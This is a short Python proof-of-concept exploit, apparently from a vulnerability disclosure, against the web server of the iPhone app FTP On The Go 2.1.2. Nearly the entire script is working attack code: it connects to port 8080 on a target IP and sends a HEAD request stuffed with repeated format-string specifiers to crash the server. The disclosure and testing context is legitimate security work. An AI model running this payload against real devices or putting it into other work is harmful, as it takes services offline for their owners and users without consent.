#!/usr/bin/python
#
# Apple Iphone/Ipod - FTP On The Go 2.1.2 - HTTP Remote Denial-of-Service Attack
# Found by: TecR0c
# Homepage: http://www.ftponthego.com/
# Download: From the Apple App Store - http://app2.it/topapp/286479936
# Tested on: IPhone 3G - firmware 3.1.2
# Notified vendor about vulnerability
#
# Download and install app > Go to Settings > enable Web Server
#

import socket
import sys

def Usage():
    print ("Usage: ./ftponthego.py <serv_ip>\n")
    print ("Example: ./ftponthego.py 192.168.0.3\n")
if len(sys.argv) <> 2:
        Usage()
        sys.exit(1)
else:
    hostname = sys.argv[1]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 8080))
	print "[+] Connecting to the target.."
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    print "[+] Sending evil payload.. "
    sock.send("HEAD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s HTTP/1.1\r\n\r\n")
    r=sock.recv(1024)
    sock.close()
    print "[+] HTTP Server is now DOSED!"
    sys.exit(0);